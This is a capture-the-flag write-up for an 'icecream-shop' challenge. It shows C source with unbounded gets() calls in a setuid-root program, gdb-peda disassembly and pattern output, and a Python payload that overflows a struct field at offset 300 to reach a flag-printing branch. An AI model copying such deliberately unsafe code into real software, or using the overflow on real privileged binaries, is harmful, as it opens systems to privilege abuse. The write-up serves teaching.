`*CHALL-TEXT*`

## Code

In this challenge, we are given access to a server with two files: *icecream-shop* and its source code *icecream-shop.c*. As we already have the source code, there is no point in reverse engineering the binary.

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

typedef struct customer {
    char name[100];
    char favorite_icecream[100];
    char amount_of_icecream[100];
    char our_relationship[100];
} customer;

int main() {
    // execute as root; don't drop privileges
    setuid(0);

    struct customer newcustomer;
    strcpy(newcustomer.our_relationship, "my new favourite client");

    puts("Good afternoon and welcome to my ice cream shop!\n");
    fputs("What's your name, friend? ", stdout);
    gets(newcustomer.name);

    printf("Lovely to meet you, %s! Now, what ice cream would you like? ", newcustomer.name);
    gets(newcustomer.favorite_icecream);

    fputs("A fine choice! How much would you like? ", stdout);
    gets(newcustomer.amount_of_icecream);
    puts("");

    if (strcmp(newcustomer.our_relationship, "my boss") == 0) {
        puts("Oh, boss, it's you! Didn't recognize ya there!");
        puts("Here, have all the ice cream you want!\n");
        system("cat /root/flag.txt");
    } else {
        printf("Anything for %s! Here you go:\n\n", newcustomer.our_relationship);
        puts("             \n\
                   ,' `,.  \n\
                   >-.(__) \n\
                  (_,-' |  \n\
                    `.  |  \n\
                      `.|  \n\
                        `  \n\
        ");
    }
}
```

In the program, we have a structure by the name of `customer` and a form to fill it with data. The program then calls `strcmp` to check if `newcustomer.our_relationship == "my boss"`. As the program sets this value itself, we should not be able to modify it. Looking closely at the `gets`-calls, they are entirely unsafe, as they don't specify a length. With a buffer size of 100 for each of the properties, we should be able to cause a buffer overflow.

---
## Analysis

Downloading the original binary to our computer using the following command:
`scp -r haaukins@icecream.hkn:icecream-shop icecream-shop`
we can analyse the executable. I'll be using gdb-peda.

With the `checksec` command, we can check for the presence of any form of protection:
```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial
```

PIE would be a problem, depending on what we wanted to do, but if we can simply overwrite the value of `our_relationship` we won't have to worry about that. Disassembling the main function yields this:

```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0000000000001195 <+0>:     push   rbp
   0x0000000000001196 <+1>:     mov    rbp,rsp
   0x0000000000001199 <+4>:     sub    rsp,0x190
   0x00000000000011a0 <+11>:    mov    edi,0x0
   0x00000000000011a5 <+16>:    call   0x1090 <setuid@plt>
   0x00000000000011aa <+21>:    lea    rax,[rbp-0x190]
   0x00000000000011b1 <+28>:    add    rax,0x12c
   0x00000000000011b7 <+34>:    movabs rdx,0x662077656e20796d
   0x00000000000011c1 <+44>:    movabs rcx,0x65746972756f7661
   0x00000000000011cb <+54>:    mov    QWORD PTR [rax],rdx
   0x00000000000011ce <+57>:    mov    QWORD PTR [rax+0x8],rcx
   0x00000000000011d2 <+61>:    movabs rdx,0x746e65696c6320
   0x00000000000011dc <+71>:    mov    QWORD PTR [rax+0x10],rdx
   0x00000000000011e0 <+75>:    lea    rdi,[rip+0xe21]        # 0x2008
   0x00000000000011e7 <+82>:    call   0x1030 <puts@plt>
   0x00000000000011ec <+87>:    mov    rax,QWORD PTR [rip+0x2e6d]        # 0x4060 <stdout@GLIBC_2.2.5>
   0x00000000000011f3 <+94>:    mov    rcx,rax
   0x00000000000011f6 <+97>:    mov    edx,0x1a
   0x00000000000011fb <+102>:   mov    esi,0x1
   0x0000000000001200 <+107>:   lea    rdi,[rip+0xe33]        # 0x203a
   0x0000000000001207 <+114>:   call   0x1080 <fwrite@plt>
   0x000000000000120c <+119>:   lea    rax,[rbp-0x190]
   0x0000000000001213 <+126>:   mov    rdi,rax
   0x0000000000001216 <+129>:   mov    eax,0x0
   0x000000000000121b <+134>:   call   0x1070 <gets@plt>
   0x0000000000001220 <+139>:   lea    rax,[rbp-0x190]
   0x0000000000001227 <+146>:   mov    rsi,rax
   0x000000000000122a <+149>:   lea    rdi,[rip+0xe27]        # 0x2058
   0x0000000000001231 <+156>:   mov    eax,0x0
   0x0000000000001236 <+161>:   call   0x1050 <printf@plt>
   0x000000000000123b <+166>:   lea    rax,[rbp-0x190]
   0x0000000000001242 <+173>:   add    rax,0x64
   0x0000000000001246 <+177>:   mov    rdi,rax
   0x0000000000001249 <+180>:   mov    eax,0x0
   0x000000000000124e <+185>:   call   0x1070 <gets@plt>
   0x0000000000001253 <+190>:   mov    rax,QWORD PTR [rip+0x2e06]        # 0x4060 <stdout@GLIBC_2.2.5>
   0x000000000000125a <+197>:   mov    rcx,rax
   0x000000000000125d <+200>:   mov    edx,0x28
   0x0000000000001262 <+205>:   mov    esi,0x1
   0x0000000000001267 <+210>:   lea    rdi,[rip+0xe2a]        # 0x2098
   0x000000000000126e <+217>:   call   0x1080 <fwrite@plt>
   0x0000000000001273 <+222>:   lea    rax,[rbp-0x190]
   0x000000000000127a <+229>:   add    rax,0xc8
   0x0000000000001280 <+235>:   mov    rdi,rax
   0x0000000000001283 <+238>:   mov    eax,0x0
   0x0000000000001288 <+243>:   call   0x1070 <gets@plt>
   0x000000000000128d <+248>:   lea    rdi,[rip+0xe2d]        # 0x20c1
   0x0000000000001294 <+255>:   call   0x1030 <puts@plt>
   0x0000000000001299 <+260>:   lea    rax,[rbp-0x190]
   0x00000000000012a0 <+267>:   add    rax,0x12c
   0x00000000000012a6 <+273>:   lea    rsi,[rip+0xe15]        # 0x20c2
   0x00000000000012ad <+280>:   mov    rdi,rax
   0x00000000000012b0 <+283>:   call   0x1060 <strcmp@plt>
   0x00000000000012b5 <+288>:   test   eax,eax
   0x00000000000012b7 <+290>:   jne    0x12df <main+330>
   0x00000000000012b9 <+292>:   lea    rdi,[rip+0xe10]        # 0x20d0
   0x00000000000012c0 <+299>:   call   0x1030 <puts@plt>
   0x00000000000012c5 <+304>:   lea    rdi,[rip+0xe34]        # 0x2100
   0x00000000000012cc <+311>:   call   0x1030 <puts@plt>
   0x00000000000012d1 <+316>:   lea    rdi,[rip+0xe50]        # 0x2128
   0x00000000000012d8 <+323>:   call   0x1040 <system@plt>
   0x00000000000012dd <+328>:   jmp    0x130c <main+375>
   0x00000000000012df <+330>:   lea    rax,[rbp-0x190]
   0x00000000000012e6 <+337>:   add    rax,0x12c
   0x00000000000012ec <+343>:   mov    rsi,rax
   0x00000000000012ef <+346>:   lea    rdi,[rip+0xe4a]        # 0x2140
   0x00000000000012f6 <+353>:   mov    eax,0x0
   0x00000000000012fb <+358>:   call   0x1050 <printf@plt>
   0x0000000000001300 <+363>:   lea    rdi,[rip+0xe59]        # 0x2160
   0x0000000000001307 <+370>:   call   0x1030 <puts@plt>
   0x000000000000130c <+375>:   mov    eax,0x0
   0x0000000000001311 <+380>:   leave  
   0x0000000000001312 <+381>:   ret    
End of assembler dump.
```

The section of interest is the lines right before `0x00000000000012b0`, where the location of the string "my boss" and the value of `our_relationship` is put into rsi and rdi respectively. A few lines earlier, rax is declared to be `rbp-0x190`, with the next line adding `0x12c` to that value. Given that the prompt for a name is writen to `0x190`, we should be able to overwrite `our_relationship`. Without bothering to calculate the offset, we will simply get gdp-peda to create a pattern, and we should be able to calculate the necesarry offset. As PIE is turned on, we need to run the program once, so that gdb can get a proper address for our breakpoint.

---
## Overflowing the buffer


```
gdb-peda$ pattern create 500 test.txt
Writing pattern of 500 chars to filename "test.txt"
gdb-peda$ break *0x00005555555552b0
Breakpoint 1 at 0x5555555552b0
gdb-peda$ r < test.txt
Starting program: /home/kali/Desktop/icecream < test.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Good afternoon and welcome to my ice cream shop!

What's your name, friend? Lovely to meet you, AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A! Now, what ice cream would you like? A fine choice! How much would you like? 
[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffdebc ("LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A")
RBX: 0x0 
RCX: 0x7ffff7cfa3f3 (<__GI___libc_write+19>:    cmp    rax,0xfffffffffffff000)
RDX: 0x1 
RSI: 0x5555555560c2 --> 0x73736f6220796d ('my boss')
RDI: 0x7fffffffdebc ("LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A")
RBP: 0x7fffffffdf20 ("A%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A")
RSP: 0x7fffffffdd90 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
RIP: 0x5555555552b0 (<main+283>:        call   0x555555555060 <strcmp@plt>)
R8 : 0x7ffff7df6a50 --> 0x0 
R9 : 0x0 
R10: 0x0 
R11: 0x246 
R12: 0x7fffffffe038 --> 0x7fffffffe38b ("/home/kali/Desktop/icecream")
R13: 0x555555555195 (<main>:    push   rbp)
R14: 0x0 
R15: 0x7ffff7ffd020 --> 0x7ffff7ffe2c0 --> 0x555555554000 --> 0x10102464c457f
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5555555552a0 <main+267>:   add    rax,0x12c
   0x5555555552a6 <main+273>:   lea    rsi,[rip+0xe15]        # 0x5555555560c2
   0x5555555552ad <main+280>:   mov    rdi,rax
=> 0x5555555552b0 <main+283>:   call   0x555555555060 <strcmp@plt>
   0x5555555552b5 <main+288>:   test   eax,eax
   0x5555555552b7 <main+290>:   jne    0x5555555552df <main+330>
   0x5555555552b9 <main+292>:   lea    rdi,[rip+0xe10]        # 0x5555555560d0
   0x5555555552c0 <main+299>:   call   0x555555555030 <puts@plt>
Guessed arguments:
arg[0]: 0x7fffffffdebc ("LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A")
arg[1]: 0x5555555560c2 --> 0x73736f6220796d ('my boss')
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdd90 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
0008| 0x7fffffffdd98 ("ABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%s"...)
0016| 0x7fffffffdda0 ("AACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%"...)
0024| 0x7fffffffdda8 ("(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A"...)
0032| 0x7fffffffddb0 ("A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;"...)
0040| 0x7fffffffddb8 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%"...)
0048| 0x7fffffffddc0 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA"...)
0056| 0x7fffffffddc8 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x00005555555552b0 in main ()
```

The important part here is the "Guessed arguments" section. We can se that we do indeed have control of `our_relationship`. gdb-peda has a handy function for calculating the offset:

```
gdb-peda$ pattern offset LA%hA%7
LA%hA%7 found at offset: 300
```

So 300 bytes of padding, then our value, and we should be golden. Using python to create the payload:

```python
with open("icecream.txt", "w+b") as f:
	f.write(b"A" * 300 + b"my boss")
```

And then testing the payload locally:

```
cat icecream.txt | ./icecream
Good afternoon and welcome to my ice cream shop!

What's your name, friend? Lovely to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAmy boss! Now, what ice cream would you like? A fine choice! How much would you like? 
Oh, boss, it's you! Didn't recognize ya there!
Here, have all the ice cream you want!

cat: /root/flag.txt: Permission denied
```

We can see that it works. Uploading the file to the server:

`scp icecream.txt haaukins@icecream.hkn:exploit.txt`

We can now run the exploit on the server granting us the flag.
